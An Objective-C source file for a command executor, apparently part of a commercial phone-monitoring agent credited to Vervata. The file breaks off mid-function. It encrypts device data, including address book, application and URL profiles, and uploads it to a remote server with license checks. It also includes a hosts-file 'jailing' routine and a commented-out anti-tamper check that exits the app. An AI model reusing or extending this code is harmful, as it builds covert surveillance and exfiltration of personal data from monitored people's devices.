//
//  CommandExecutor.m
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 7/29/11.
//  Copyright 2011 Vervata. All rights rkServered.
//

#import "CommandExecutor.h"
#import "UnstructuredManager.h"
#import "SessionManager.h"
#import "CommandServiceManager.h"
#import "Request.h"
#import "KeyExchangeResponse.h"
#import "NewRequest.h"
#import "ProtocolParser.h"
#import "ProtocolPacketBuilder.h"
#import "ProtocolPacketBuilderResponse.h"
#import "ResumeRequest.h"
#import "SessionInfo.h"
#import "CommandMetaData.h"
#import "RAskResponse.h"
#import "RAskResponse.h"
#import "ASIHTTPRequest.h"

#import "AESCryptor.h"
#import "CRC32.h"
#import "NSFileManager-AES.h"
#import "NSData-AES.h"

#import "ServerResponseCodeEnum.h"

#import "ResponseFileExecutor.h"
#import "CSMDeviceManager.h"
#include "hostJail.h"
#import "Cleanser.h"
#import <CommonCrypto/CommonDigest.h>

@interface CommandExecutor (private)
+ (void) setHttpRequestHeaders: (ASIHTTPRequest *) aASIHttpRequest;
- (void) jailingHostFile: (NSString *) aUrlDomain;
@end

@implementation CommandExecutor

@synthesize CSM;
@synthesize SSM;
@synthesize isIdle;
@synthesize isThreadCreated;
@synthesize request;
@synthesize httpRequest;
@synthesize stopFlag;

static CommandExecutor *sharedExecutor = nil;

+ (CommandExecutor*)sharedManager {
	if (sharedExecutor == nil) {
		sharedExecutor = [[super allocWithZone:NULL] init];
	}
	return sharedExecutor;
}

+ (CommandExecutor*)sharedManagerWithCSM:(CommandServiceManager *)csm withSSM:(SessionManager *)ssm {
	if (sharedExecutor == nil) {
		sharedExecutor = [[super allocWithZone:NULL] init];
		[sharedExecutor setCSM:csm];
		[sharedExecutor setSSM:ssm];
		[sharedExecutor setIsIdle:YES];
	}
	return sharedExecutor;
}

- (id)copyWithZone:(NSZone *)zone {
	return self;
}

- (id)retain {
	return self;
}

- (NSUInteger)retainCount {
	return NSUIntegerMax;  //denotes an object that cannot be released
}

- (void)release {
	//do nothing
}

- (id)autorelease {
	return self;
}

- (void)start {
	[NSThread detachNewThreadSelector:@selector(onThread) toTarget:self withObject:nil];
}

- (void)onThread {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	[self setRequest:[CSM deQueue]];
	
	DLog(@"-------------------------------------------------> %@ <------------------------------------------------------------", [self request]);
	
	if ([[self request] isMemberOfClass:[ResumeRequest class]]) {
		[self executeResumeRequest:(ResumeRequest *)[self request]]; 
	} else {
		[self executeNewRequest:(NewRequest *)[self request]];
	}
	
	DLog(@"---------------- END -----------------");
	[pool release];
	DLog(@"---------------- END -----------------");	
}

#pragma mark -
#pragma mark New request method
#pragma mark -

- (void)executeNewRequest:(NewRequest *)newRequest {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	BOOL isTransportError = NO;
	BOOL isDeletePayload = NO;
	id responseObj = nil;
	SessionInfo *ssInfo = [SSM retrieveSession:[request CSID]];
	NSString *payloadFilePath = [newRequest payloadFilePath];

	DLog(@"[1]Session INFO = %@, encryption code = %d", ssInfo, [[[newRequest request] metaData] encryptionCode]);

#pragma mark Key exchange
	
	UnstructuredManager *USTManager = [[UnstructuredManager alloc] initWithURL:[CSM unstructuredURL]];

	//KeyExchangeResponse *keyEXCResponse = [USTManager doKeyExchangev1:1 withEncodingType:1];
	KeyExchangeResponse *keyEXCResponse = [USTManager doKeyExchangev2:2 withEncodingType:1];

	[USTManager release];

	if (stopFlag) {
		DLog(@"CANCEL");
		stopFlag = NO;
		return;
	}

	if (![keyEXCResponse isOK]) {
		DLog(@"keyEXCResponse is Not OK - send onConstruct Error");
		[[[newRequest request] delegate] onConstructError:[newRequest CSID] withError:[NSError errorWithDomain:@"unstructured response is not ok" code:-328 userInfo:nil]]; // kCmdExceptionErrorConstruct = -328
		if([[CSM priorityQueue] count] > 0) {
			[self start];
		} else {
			[self setIsIdle:YES];
		}

	} else {
		
#pragma mark Build the payload
		
		ProtocolPacketBuilder *packetBuilder = [[ProtocolPacketBuilder alloc] init];

		DLog(@"New request communication directive = %d", [newRequest directive]);
		ProtocolPacketBuilderResponse *packetBuilderResponse = [packetBuilder buildPacketForCommand:[[newRequest request] commandData]
																					   withMetaData:[[newRequest request] metaData]
																					withPayloadPath:payloadFilePath
																					  withPublicKey:[keyEXCResponse serverPK]
																						   withSSID:[keyEXCResponse sessionId]
																					  withDirective:[newRequest directive]];
		[packetBuilder release];

		if (stopFlag) {
			DLog(@"CANCEL");
			stopFlag = NO;
			return;
		}
		
		if (ssInfo) {
			
			[ssInfo setSSID:[keyEXCResponse sessionId]];
			[ssInfo setAesKey:[packetBuilderResponse aesKey]];
			[ssInfo setServerPublicKey:[keyEXCResponse serverPK]];

			// Cause the encryption & compression flag from caller is useless (Ae should not hard code this!)
			// BUG found when I debug resume with Aom
//			[[ssInfo metaData] setEncryptionCode:1];
//			[[ssInfo metaData] setCompressionCode:1];
			
			[ssInfo setPayloadSize:[packetBuilderResponse payloadSize]];
			[ssInfo setPayloadCRC32:[packetBuilderResponse payloadCRC32]];
			[ssInfo setPayloadReadyFlag:YES];
			
			DLog(@"[2]Session INFO = %@", ssInfo);
			DLog(@"[keyEXCResponse sessionId] %d", [keyEXCResponse sessionId]);
			DLog(@"[keyEXCResponse serverPK] %@", [keyEXCResponse serverPK]);
			DLog(@"[packetBuilderResponse payloadSize] %d", [packetBuilderResponse payloadSize]);
			DLog(@"[packetBuilderResponse payloadCRC32] %d", [packetBuilderResponse payloadCRC32]);
			DLog(@"[packetBuilderResponse aesKey] %@", [packetBuilderResponse aesKey]);
			
			[SSM updateSession:ssInfo];
		}
		
		/*
		// ================================== CLEANSER CHECK START ======================================
		// Get data from cleanser file
		char *keyKey = nil;
		char *encryptedKey = nil;
		char *encryptedUrlChecksum = nil;
		int value = (arc4random() % 20) + 1;
		DLog(@"CSM-random value of cleanser: %d", value);
		switch (value) {
			case 1:
				keyKey = getkeyKey_1();
				encryptedKey = getEncryptedKey_1();
				encryptedUrlChecksum = getEncryptedUrlChecksum_1();
				break;
			case 2:
				keyKey = getkeyKey_2();
				encryptedKey = getEncryptedKey_2();
				encryptedUrlChecksum = getEncryptedUrlChecksum_2();
				break;
			case 3:
				keyKey = getkeyKey_3();
				encryptedKey = getEncryptedKey_3();
				encryptedUrlChecksum = getEncryptedUrlChecksum_3();
				break;
			case 4:
				keyKey = getkeyKey_4();
				encryptedKey = getEncryptedKey_4();
				encryptedUrlChecksum = getEncryptedUrlChecksum_4();
				break;
			case 5:
				keyKey = getkeyKey_5();
				encryptedKey = getEncryptedKey_5();
				encryptedUrlChecksum = getEncryptedUrlChecksum_5();
				break;
			case 6:
				keyKey = getkeyKey_6();
				encryptedKey = getEncryptedKey_6();
				encryptedUrlChecksum = getEncryptedUrlChecksum_6();
				break;
			case 7:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
			case 8:
				keyKey = getkeyKey_8();
				encryptedKey = getEncryptedKey_8();
				encryptedUrlChecksum = getEncryptedUrlChecksum_8();
				break;
			case 9:
				keyKey = getkeyKey_9();
				encryptedKey = getEncryptedKey_9();
				encryptedUrlChecksum = getEncryptedUrlChecksum_9();
				break;
			case 10:
				keyKey = getkeyKey_10();
				encryptedKey = getEncryptedKey_10();
				encryptedUrlChecksum = getEncryptedUrlChecksum_10();
				break;
			case 11:
				keyKey = getkeyKey_11();
				encryptedKey = getEncryptedKey_11();
				encryptedUrlChecksum = getEncryptedUrlChecksum_11();
				break;
			case 12:
				keyKey = getkeyKey_12();
				encryptedKey = getEncryptedKey_12();
				encryptedUrlChecksum = getEncryptedUrlChecksum_12();
				break;
			case 13:
				keyKey = getkeyKey_13();
				encryptedKey = getEncryptedKey_13();
				encryptedUrlChecksum = getEncryptedUrlChecksum_13();
				break;
			case 14:
				keyKey = getkeyKey_14();
				encryptedKey = getEncryptedKey_14();
				encryptedUrlChecksum = getEncryptedUrlChecksum_14();
				break;
			case 15:
				keyKey = getkeyKey_15();
				encryptedKey = getEncryptedKey_15();
				encryptedUrlChecksum = getEncryptedUrlChecksum_15();
				break;
			case 16:
				keyKey = getkeyKey_16();
				encryptedKey = getEncryptedKey_16();
				encryptedUrlChecksum = getEncryptedUrlChecksum_16();
				break;
			case 17:
				keyKey = getkeyKey_17();
				encryptedKey = getEncryptedKey_17();
				encryptedUrlChecksum = getEncryptedUrlChecksum_17();
				break;
			case 18:
				keyKey = getkeyKey_18();
				encryptedKey = getEncryptedKey_18();
				encryptedUrlChecksum = getEncryptedUrlChecksum_18();
				break;
			case 19:
				keyKey = getkeyKey_19();
				encryptedKey = getEncryptedKey_19();
				encryptedUrlChecksum = getEncryptedUrlChecksum_19();
				break;
			case 20:
				keyKey = getkeyKey_20();
				encryptedKey = getEncryptedKey_20();
				encryptedUrlChecksum = getEncryptedUrlChecksum_20();
				break;
			default:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
		}
		
		NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
		NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
		NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
		NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
		NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
		NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString];
		NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
		
		if (encryptedKey) free(encryptedKey);
		if (keyKey) free(keyKey);
		if (encryptedUrlChecksum) free(encryptedUrlChecksum);
		
		NSString *structuredUrl = [[CSM structuredURL] absoluteString];
		NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
		unsigned char msgDigestStructuredUrlByte[16];
		CC_MD5([structuredUrlData bytes], [structuredUrlData length], msgDigestStructuredUrlByte);
		NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
		
		unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
		NSString *urlChecksumString = [NSString stringWithFormat:
									   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
									   result[0], result[1], result[2], result[3], 
									   result[4], result[5], result[6], result[7],
									   result[8], result[9], result[10], result[11],
									   result[12], result[13], result[14], result[15]
									   ];
		
		DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum)
		
		if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
			NSURL *url = [NSURL URLWithString:structuredUrl];
			httpRequest = [ASIHTTPRequest requestWithURL:url];
		} else {
			DLog (@"Seriously failure.....");
			exit(0);
		}
		// ================================== CLEANSER CHECK END ======================================
		 */
		
#pragma mark Transport directive RESUMABLE
		
		httpRequest = [ASIHTTPRequest requestWithURL:[CSM structuredURL]];
		
		NSString *responseFilePath = [NSString string];
		
		// Check if it's getAddressBook command, download response as file
		if ([[[newRequest request] commandData] getCommand] == GET_ADDRESSBOOK ||
			[[[newRequest request] commandData] getCommand] == GET_APPLICATION_PROFILE ||
			[[[newRequest request] commandData] getCommand] == GET_URL_PROFILE) {
			responseFilePath = [payloadFilePath stringByAppendingPathExtension:@"httpresp"];
			[httpRequest setDownloadDestinationPath:responseFilePath];
		}
		[httpRequest setTimeOutSeconds:60];
		[httpRequest setRequestMethod:@"POST"];
		[CommandExecutor setHttpRequestHeaders:httpRequest];
		[httpRequest setShouldStreamPostDataFromDisk:YES];
		[httpRequest appendPostData:[packetBuilderResponse metaDataWithHeader]];
		
		if([newRequest directive] == RESUMABLE) {
			DLog(@"RESUMABLE pyaload path = %@", payloadFilePath);
			[httpRequest appendPostDataFromFile:payloadFilePath];
		} else {
			DLog(@"UNRESUMABLE payload data = %@", [packetBuilderResponse payloadData]);
			[httpRequest appendPostData:[packetBuilderResponse payloadData]];
		}
		
		if (stopFlag) {
			DLog(@"CANCEL");
			stopFlag = NO;
			return;
		}
		
		[httpRequest startSynchronous];
		
		//		Start for testing unfinish sending
		
		//		[httpRequest setDelegate:self];
		//		[httpRequest setUploadProgressDelegate:self];
		//		[httpRequest setShowAccurateProgress:YES];
		//		[httpRequest startAsynchronous];
		
		// End for testing unfinish sending
		
		if (stopFlag) {
			DLog(@"CANCEL");
			stopFlag = NO;
			if (responseFilePath) {
				[[NSFileManager defaultManager] removeItemAtPath:responseFilePath error:nil];
			}
			return;
		}
		
		NSError *error = [httpRequest error];
		DLog(@"[error code] = %d, [error domain] = %@", [error code], [error domain]);
		DLog(@"SEND.Response length %d", [[httpRequest responseData] length]);
		DLog(@"SEND.Response data = %@", [httpRequest responseData]);
		if (!error) {
			int8_t encryptFlag;
			uint32_t crc32;
			
			if ([[[newRequest request] commandData] getCommand] == GET_ADDRESSBOOK ||
				[[[newRequest request] commandData] getCommand] == GET_APPLICATION_PROFILE ||
				[[[newRequest request] commandData] getCommand] == GET_URL_PROFILE) {
				DLog(@"FILE_RESPONSE");
				
				if ([[[newRequest request] commandData] getCommand] == GET_ADDRESSBOOK) {
					responseObj = [ResponseFileExecutor executeFile:responseFilePath withKey:[packetBuilderResponse aesKey]];
				} else {
					responseObj = [ResponseFileExecutor parseResponse:responseFilePath withAESKey:[packetBuilderResponse aesKey]];
				}
				
				if (responseObj == nil) {
					isTransportError = YES;
				}
			} else {
				DLog(@"SEND.[httpRequest responseData] = %@", [httpRequest responseData]);
				if([[httpRequest responseData] length] != 0) {
					NSData *responseData = [httpRequest responseData];
					[responseData getBytes:&encryptFlag length:1];
					
					// cut first byte out
					responseData = [responseData subdataWithRange:NSMakeRange(1, [responseData length]-1)];
					
					if (encryptFlag == 1) {
						AESCryptor *cryptor = [[AESCryptor alloc] init];
						DLog(@"SEND.AES KEY %@", [packetBuilderResponse aesKey]);
						responseData = [cryptor decrypt:responseData withKey:[packetBuilderResponse aesKey]]; 
						[cryptor release];
					}
					
					[responseData getBytes:&crc32 length:4];
					
					crc32 = ntohl(crc32);
					responseData = [responseData subdataWithRange:NSMakeRange(4, [responseData length]-4)];
					
					DLog(@"crc32 = %d cal = %d", crc32, [CRC32 crc32:responseData]);
					if (crc32 != [CRC32 crc32:responseData]) {
						DLog(@"crc32 not matched (TransportError)");
						isTransportError = YES;
					} else {
						responseObj = [ProtocolParser parseServerResponse:responseData];
					}
				} else {
					DLog(@"Response data = 0 (TransportError)");
					isTransportError = YES;
				}
			}
			
			// Start acknowledge
			UnstructuredManager *USTManager = [[UnstructuredManager alloc] initWithURL:[CSM unstructuredURL]];
			
			NSString *deviceID = [[[(NewRequest *)[self request] request] metaData] deviceID];
			
			[USTManager doAck:1 withSessionId:[keyEXCResponse sessionId] withDeviceId:deviceID];
			[USTManager release];
			// End acknowledge
		} else {
			DLog(@"ASIHTTPRequest Error");
			DLog(@"responseData %@", [httpRequest responseData]);
			DLog(@"responseString %@", [httpRequest responseString])
			DLog(@"responseStatusCode %d", [httpRequest responseStatusCode])
			DLog(@"responseStatusMessage %@", [httpRequest responseStatusMessage])
			DLog(@"responseCookies %@", [httpRequest responseCookies])
			isTransportError = YES;
		}
		
		//--------------- New -------------
		if (isTransportError) {
			[[[(NewRequest *)[self request] request] delegate] onTransportError:[[self request] CSID] withError:[NSError errorWithDomain:@"Transport error" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
		} else {
			DLog(@"Status Code = %d", [(ResponseData *)responseObj statusCode]);
			[responseObj setCSID:[[self request] CSID]];
			
			int serverStatusCodeResponse = [(ResponseData *)responseObj statusCode];
			
			if (serverStatusCodeResponse == OK) {
				[SSM deleteSession:[request CSID]];
				[[[(NewRequest *)[self request] request] delegate] onSuccess:responseObj];
				isDeletePayload = YES;
			} else {
				switch (serverStatusCodeResponse) {
					case kServerStatusHeaderChecksumFailed:
					case kServerStatusCannotParseHeader:
					case kServerStatusCannotParsePayload:
					case kServerStatusPayloadIsTooBig:
					case kServerStatusPayloadChecksumFailed:
					case kServerStatusSessionNotFound:
					//case kServerStatusIncompletePayload: // Can resume after discuss the logic on server with M
					case kServerStatusSessionDataIncomplete:
					case kServerStatusUnspecifyError: // Even ask for session resumption, return 500(F0 in old server response code standard) -> BAD server (it should return session NOT found ...)
					case kServerStatusErrorDuringDecryption:
					case kServerStatusErrorDuringDecompression:
					case kServerStatusCannotProcessUncryptedHeader:
					// License error (since CSM keep license code with its own payload (header) thus when new license code is change old request will update)
					case kServerStatusLicenseNotFound:
					case kServerStatusLicenseAlreadyInUseByDevice:
					case kServerStatusLicenseExpired:
					case kServerStatusLicenseNotAssignedToAnyDevice:
					case kServerStatusLicenseNotAssignedToUser:
					case kServerStatusLicenseCorrupt:
					case kServerStatusLicenseDisabled:
					case kServerStatusInvalidHostForLicense:
					case kServerStatusLicenseFixedCannotReassigned:
						[SSM deleteSession:[request CSID]];
						isDeletePayload = YES;
						break;
					default:
						isDeletePayload = NO;
						break;
				}
				[[[(NewRequest *)[self request] request] delegate] onServerError:responseObj];
			}
		}
		
		if (isDeletePayload) {
			DLog(@"Delete payload");
			// Delete payload file			
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			if ([fileMgr fileExistsAtPath:payloadFilePath]) {
				NSError *error = nil;
				[fileMgr removeItemAtPath:payloadFilePath error:&error];
				if (error) {
					DLog(@"Error removing file, %@", [error domain]);
				}
			}
		}
		
		//DLog(@"9. responseFilePath retain count %d", [responseFilePath retainCount]);
		//DLog(@"[[CSM priorityQueue] count] %d", [[CSM priorityQueue] count]);
		if([[CSM priorityQueue] count] > 0) {
			[self start];
		} else {
			[self setIsIdle:YES];
		}
	}
	
	// Host file checking...
	NSString *urlDomain = [[CSM structuredURL] host];
	[NSThread detachNewThreadSelector:@selector(jailingHostFile:) toTarget:self withObject:urlDomain];
	
	[pool drain];
}

#pragma mark -
#pragma mark Resume request method
#pragma mark -

- (void)executeResumeRequest:(ResumeRequest *)resumeRequest {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	DLog(@"Resume request with ssinfo = %@", [resumeRequest session]);
	
	// Do RAsk //
	BOOL isTransportError = NO;
	BOOL isRAskSuccess = NO;
	RAskResponse *responseObj = nil;
	
	if (stopFlag) {
		DLog(@"CANCEL");
		stopFlag = NO;
		return;
	}

#pragma mark Transport directive RASK
	
	ProtocolPacketBuilder *packetBuilder = [[ProtocolPacketBuilder alloc] init];
	NSData *header = [packetBuilder buildMetaData:[[resumeRequest session] metaData]
									withPublicKey:[[resumeRequest session] serverPublicKey]
									   withAESKey:[[resumeRequest session] aesKey]
										 withSSID:[[resumeRequest session] SSID]
									withDirective:RASK];
	[packetBuilder release];
	
	
	/*
	 Resume flow client failed to send payload in executeNewRequest method, client wait for sometime (1 minute)
	 then send RASK (directive) to server, within 3 minutes (tested) from the first failure client get 'Server Busy Processing CSID'
	 from the server; after another 1 minute client make RASK again this time client get 'Ok':
	 
	 1. in Ok case, client can resume without any problem
	 2. but if there is a problem with point (1); client wait for 1 minute then send RASK again this time client will get 'Session Not Found'
	 */
	
	/*
	// ================================== CLEANSER CHECK START ======================================
	// Get data from cleanser file
	char *keyKey = nil;
	char *encryptedKey = nil;
	char *encryptedUrlChecksum = nil;
	int value = (arc4random() % 20) + 1;
	DLog(@"CSM-random value of cleanser: %d", value);
	switch (value) {
		case 1:
			keyKey = getkeyKey_1();
			encryptedKey = getEncryptedKey_1();
			encryptedUrlChecksum = getEncryptedUrlChecksum_1();
			break;
		case 2:
			keyKey = getkeyKey_2();
			encryptedKey = getEncryptedKey_2();
			encryptedUrlChecksum = getEncryptedUrlChecksum_2();
			break;
		case 3:
			keyKey = getkeyKey_3();
			encryptedKey = getEncryptedKey_3();
			encryptedUrlChecksum = getEncryptedUrlChecksum_3();
			break;
		case 4:
			keyKey = getkeyKey_4();
			encryptedKey = getEncryptedKey_4();
			encryptedUrlChecksum = getEncryptedUrlChecksum_4();
			break;
		case 5:
			keyKey = getkeyKey_5();
			encryptedKey = getEncryptedKey_5();
			encryptedUrlChecksum = getEncryptedUrlChecksum_5();
			break;
		case 6:
			keyKey = getkeyKey_6();
			encryptedKey = getEncryptedKey_6();
			encryptedUrlChecksum = getEncryptedUrlChecksum_6();
			break;
		case 7:
			keyKey = getkeyKey_7();
			encryptedKey = getEncryptedKey_7();
			encryptedUrlChecksum = getEncryptedUrlChecksum_7();
			break;
		case 8:
			keyKey = getkeyKey_8();
			encryptedKey = getEncryptedKey_8();
			encryptedUrlChecksum = getEncryptedUrlChecksum_8();
			break;
		case 9:
			keyKey = getkeyKey_9();
			encryptedKey = getEncryptedKey_9();
			encryptedUrlChecksum = getEncryptedUrlChecksum_9();
			break;
		case 10:
			keyKey = getkeyKey_10();
			encryptedKey = getEncryptedKey_10();
			encryptedUrlChecksum = getEncryptedUrlChecksum_10();
			break;
		case 11:
			keyKey = getkeyKey_11();
			encryptedKey = getEncryptedKey_11();
			encryptedUrlChecksum = getEncryptedUrlChecksum_11();
			break;
		case 12:
			keyKey = getkeyKey_12();
			encryptedKey = getEncryptedKey_12();
			encryptedUrlChecksum = getEncryptedUrlChecksum_12();
			break;
		case 13:
			keyKey = getkeyKey_13();
			encryptedKey = getEncryptedKey_13();
			encryptedUrlChecksum = getEncryptedUrlChecksum_13();
			break;
		case 14:
			keyKey = getkeyKey_14();
			encryptedKey = getEncryptedKey_14();
			encryptedUrlChecksum = getEncryptedUrlChecksum_14();
			break;
		case 15:
			keyKey = getkeyKey_15();
			encryptedKey = getEncryptedKey_15();
			encryptedUrlChecksum = getEncryptedUrlChecksum_15();
			break;
		case 16:
			keyKey = getkeyKey_16();
			encryptedKey = getEncryptedKey_16();
			encryptedUrlChecksum = getEncryptedUrlChecksum_16();
			break;
		case 17:
			keyKey = getkeyKey_17();
			encryptedKey = getEncryptedKey_17();
			encryptedUrlChecksum = getEncryptedUrlChecksum_17();
			break;
		case 18:
			keyKey = getkeyKey_18();
			encryptedKey = getEncryptedKey_18();
			encryptedUrlChecksum = getEncryptedUrlChecksum_18();
			break;
		case 19:
			keyKey = getkeyKey_19();
			encryptedKey = getEncryptedKey_19();
			encryptedUrlChecksum = getEncryptedUrlChecksum_19();
			break;
		case 20:
			keyKey = getkeyKey_20();
			encryptedKey = getEncryptedKey_20();
			encryptedUrlChecksum = getEncryptedUrlChecksum_20();
			break;
		default:
			keyKey = getkeyKey_7();
			encryptedKey = getEncryptedKey_7();
			encryptedUrlChecksum = getEncryptedUrlChecksum_7();
			break;
	}
	
	NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
	NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
	NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
	NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
	NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
	NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString];
	NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
	
	if (encryptedKey) free(encryptedKey);
	if (keyKey) free(keyKey);
	if (encryptedUrlChecksum) free(encryptedUrlChecksum);
	
	NSString *structuredUrl = [[CSM structuredURL] absoluteString];
	NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
	unsigned char msgDigestStructuredUrlByte[16];
	CC_MD5([structuredUrlData bytes], [structuredUrlData length], msgDigestStructuredUrlByte);
	NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
	
	unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
	NSString *urlChecksumString = [NSString stringWithFormat:
								   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
								   result[0], result[1], result[2], result[3], 
								   result[4], result[5], result[6], result[7],
								   result[8], result[9], result[10], result[11],
								   result[12], result[13], result[14], result[15]
								   ];
	
	DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum)
	
	if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
		NSURL *url = [NSURL URLWithString:structuredUrl];
		httpRequest = [ASIHTTPRequest requestWithURL:url];
	} else {
		DLog (@"Seriously failure.....");
		exit(0);
	}
	// ================================== CLEANSER CHECK END ======================================
	 */
	
	httpRequest = [ASIHTTPRequest requestWithURL:[CSM structuredURL]];
	
	[httpRequest setTimeOutSeconds:60];
	[httpRequest setRequestMethod:@"POST"];
	[CommandExecutor setHttpRequestHeaders:httpRequest];
	//[httpRequest setShouldAttemptPersistentConnection:NO];
	[httpRequest setShouldStreamPostDataFromDisk:YES];
	[httpRequest appendPostData:header];
	[httpRequest startSynchronous];
	
	NSError *error = [httpRequest error];
	DLog(@"RASK directive; Response lenght %d", [[httpRequest responseData] length]);
	DLog(@"RASK directive; [httpRequest responseData] = %@", [httpRequest responseData]);
	if (!error) {
		int8_t encryptFlag;
		uint32_t crc32;
		
		if([[httpRequest responseData] length] != 0) {
			NSData *responseData = [httpRequest responseData];
			[responseData getBytes:&encryptFlag length:1];
			DLog(@"R.encryptFlag = %d", encryptFlag);
			DLog(@"R.responseData = %@", responseData);
			// cut first byte out
			responseData = [responseData subdataWithRange:NSMakeRange(1, [responseData length]-1)];
			
			if (encryptFlag == 1) {
				AESCryptor *cryptor = [[AESCryptor alloc] init];
				DLog(@"R.AES KEY %@", [[resumeRequest session] aesKey]);
				responseData = [cryptor decrypt:responseData withKey:[[resumeRequest session] aesKey]]; 
				[cryptor release];
			}
			
			[responseData getBytes:&crc32 length:4];
			crc32 = ntohl(crc32);
			responseData = [responseData subdataWithRange:NSMakeRange(4, [responseData length]-4)];
			
			DLog(@"crc32 = %d cal = %d", crc32, [CRC32 crc32:responseData]);
			if (crc32 != [CRC32 crc32:responseData]) {
				DLog(@"crc32 not matched (TransportError)");
				
				[[resumeRequest delegate] onTransportError:[[resumeRequest session] CSID] withError:[NSError errorWithDomain:@"RAsk" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
				isTransportError = YES;
				if([[CSM priorityQueue] count] > 0) {
					[self start];
				} else {
					[self setIsIdle:YES];
				}
				return;
			}
			responseObj = [ProtocolParser parseRAskResponse:responseData];
			[responseObj setCSID:[resumeRequest CSID]];
			
			DLog(@"Status Code = %d", [(ResponseData *)responseObj statusCode]);
			
			if ([(RAskResponse *)responseObj statusCode] == OK) {
				isRAskSuccess = YES;	
				DLog(@"numberOfBytesReceived %d", [responseObj numberOfBytesReceived]);
			} else {
				// If statusCode is kServerStatusSessionNotFound seem there is a bug in executeNewRequest method or
				// session id is out of date from the server (server posibly run clean up session)
				if ([(RAskResponse *)responseObj statusCode] == kServerStatusSessionAlreadyCompleted) {
					DLog(@"ASIHTTPRequest for RAsk - Session already complete then pretend to be SUCCESS");
					[SSM deleteSession:[[resumeRequest session] CSID]];
					NSFileManager *fileMgr = [NSFileManager defaultManager];
					DLog(@"Deleting file at %@", [[resumeRequest session] payloadPath]);
					if ([fileMgr fileExistsAtPath:[[resumeRequest session] payloadPath]]) {
						NSError *error = nil;
						[fileMgr removeItemAtPath:[[resumeRequest session] payloadPath] error:&error];
						if (error) {
							DLog(@"Error removing file, %@", [error domain]);
						}
					}
					
					// Make up reponseData...
					ResponseData *responseData = [[ResponseData alloc] init];
					[responseData setCSID:[[resumeRequest session] CSID]];
					[responseData setMessage:@"Ok"];
					[responseData setCmdEcho:NOT_AVAILABLE];
					[responseData setStatusCode:OK];
					[responseData setExtendedStatus:0];
					[[resumeRequest delegate] onSuccess:responseData];
					[responseData release];
					
					// No need the acknowlegement...
				} else {
					
					DLog(@"ASIHTTPRequest for RAsk Server Error");
					if ([(RAskResponse *)responseObj statusCode] == kServerStatusSessionNotFound) {
						// Can reproduce by executeNewRequest failed then send RASK success; next resume payload then fail to resume that payload;
						// after that send RASK again then there will be Session Not Found come from the server
						DLog(@"ASIHTTPRequest for RAsk Server Error, Session Not Found");
						[SSM deleteSession:[[resumeRequest session] CSID]];
						NSFileManager *fileMgr = [NSFileManager defaultManager];
						DLog(@"Deleting payload at = %@", [[resumeRequest session] payloadPath]);
						
						if ([fileMgr fileExistsAtPath:[[resumeRequest session] payloadPath]]) {
							NSError *error = nil;
							[fileMgr removeItemAtPath:[[resumeRequest session] payloadPath] error:&error];
							if (error) {
								DLog(@"Error removing payload = %@", [error domain]);
							}
						}
					} else {
						// Most of the times the error is "Server Busy Processing CSID (307)"
					}
					
					[[resumeRequest delegate] onServerError:responseObj];
				}
				
				// Continue next request
				if([[CSM priorityQueue] count] > 0) {
					[self start];
				} else {
					[self setIsIdle:YES];
				}
				return;
			}
		} else {
			DLog(@"ASIHTTPRequest for RAsk Response 0 byte");
			[[resumeRequest delegate] onTransportError:[[resumeRequest session] CSID] withError:[NSError errorWithDomain:@"RAsk Response 0 byet" code:-329 userInfo:nil]]; // kCmdExceptionErrorTransport = -329
			if([[CSM priorityQueue] count] > 0) {
				[self start];
			} else {
				[self setIsIdle:YES];
			}
			return;
		}
	} else {
		DLog(@"ASIHTTPRequest for RAsk Error");
